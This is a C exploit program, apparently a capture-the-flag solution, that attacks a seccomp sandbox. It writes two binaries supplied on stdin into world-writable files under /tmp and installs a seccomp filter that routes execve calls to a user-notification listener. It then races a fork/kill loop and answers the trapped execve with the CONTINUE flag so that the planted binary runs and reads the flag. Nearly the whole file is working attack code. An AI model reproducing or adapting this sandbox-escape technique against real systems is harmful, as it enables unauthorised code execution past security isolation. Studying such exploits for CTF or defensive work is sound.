#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <sys/socket.h>
#include <linux/seccomp.h>
#include "seccomp-bpf.h"

void allocSeccompNotifBuffers(struct seccomp_notif **req, 
							  struct seccomp_notif_resp **resp, 
							  struct seccomp_notif_sizes *sizes){
	if (seccomp(SECCOMP_GET_NOTIF_SIZES, 0, sizes) == -1){
		perror("seccomp(SECCOMP_GET_NOTIF_SIZES)");
		exit(1);
	}

	*req = malloc(sizes->seccomp_notif);
	if (*req == NULL){
	   puts("err: malloc-seccomp_notif");
	   exit(1);
	}

	size_t resp_size = sizes->seccomp_notif_resp;
	if (sizeof(struct seccomp_notif_resp) > resp_size){
	   resp_size = sizeof(struct seccomp_notif_resp);
	}

	*resp = malloc(resp_size);
	if (resp == NULL){
	   puts("err: malloc-seccomp_notif_resp");
	   exit(1);
	}
}


int seccomp(unsigned int operation, unsigned int flags, void *args){
	return syscall(__NR_seccomp, operation, flags, args);
}

void readBinary1(){
  int sz,readed;
	if(open("/tmp/exploit2",0) == -1){
		  printf("size:");
		  scanf("%d",&sz);
		  char *buf = malloc(sz);
		  int f = open("/tmp/exploit2",O_WRONLY|O_CREAT,0777);
		  while(sz > 0){
		    readed = read(0,buf,sz);
		    write(f,buf,readed);
		    sz -= readed;
		  }
		  close(f);
	}


}

void readBinary2(){
	if(open("/tmp/payload",0) == -1){
	  int sz,readed;
	  printf("size:");
	  scanf("%d",&sz);
	  char *buf = malloc(sz);

	  int f = open("/tmp/payload",O_WRONLY|O_CREAT,0777);
	  while(sz > 0){
	    readed = read(0,buf,sz);
	    write(f,buf,readed);
	    sz -= readed;
	  }
	  close(f);
	 }
}

int main(){
	int fd;
	struct seccomp_notif_sizes sizes;
	struct seccomp_notif *req;
	struct seccomp_notif_resp *resp;
	char *file_path;
	int status;
	setbuf(stdout,NULL);
	setbuf(stdin,NULL);

	puts("Enter");
	readBinary1();
	readBinary2();
	prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
	allocSeccompNotifBuffers(&req, &resp, &sizes);

	struct sock_filter filter[] = {
		VALIDATE_ARCHITECTURE,
		EXAMINE_SYSCALL,
		DISALLOW_SYSCALL(execveat),
		DISALLOW_SYSCALL(ptrace),
		NOTIF_SYSCALL(execve),
		ALLOW_STMT
	};

	struct sock_fprog prog = {
		.len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
		.filter = filter,
	};
	puts("DOING");
	if(!fork()){
		// fork();
		for(int i=0;i<3000000;i++){
			int pid;
			if((pid = fork())){
				kill(pid,9);
				waitpid(pid,&status,0);
			} else {
				execve("/dfdf",0,0);
				return 1;
			}

		}
	} else {
		sleep(2);
		while(1){
			if ((fd = seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &prog)) != -1) {
				break;
			}
		}
		puts("Sice");


		if(fork()){
			puts("parent!!");
			// parent
			for (;;) {
				memset(req, 0, sizes.seccomp_notif);
				if (ioctl(fd, SECCOMP_IOCTL_NOTIF_RECV, req) == -1) {
					if (errno == EINTR){ continue; }
					puts("err: ioctl-SECCOMP_IOCTL_NOTIF_RECV");
					exit(1);
				}
				resp->id = req->id;
				resp->flags = SECCOMP_USER_NOTIF_FLAG_CONTINUE;
				resp->val = 0;
				resp->error = 0;
				printf("%d\n",req->data.nr);
				if (ioctl(fd, SECCOMP_IOCTL_NOTIF_SEND, resp) == -1) {
					perror("ioctl-notifyfd failed for some reason");
				}
				close(fd);
				sleep(100);
			}
			puts("Exits");
		} else {
			puts("Reading flag");
			execve("/tmp/exploit2",0,0);
			// execve("/tmp/exploit2",0,0);
			// perror("A");
			printf("%d\n",errno);
			puts("OK@!");
			exit(1);
		}
	}

}

// int main(){
	



	// return 0;
// }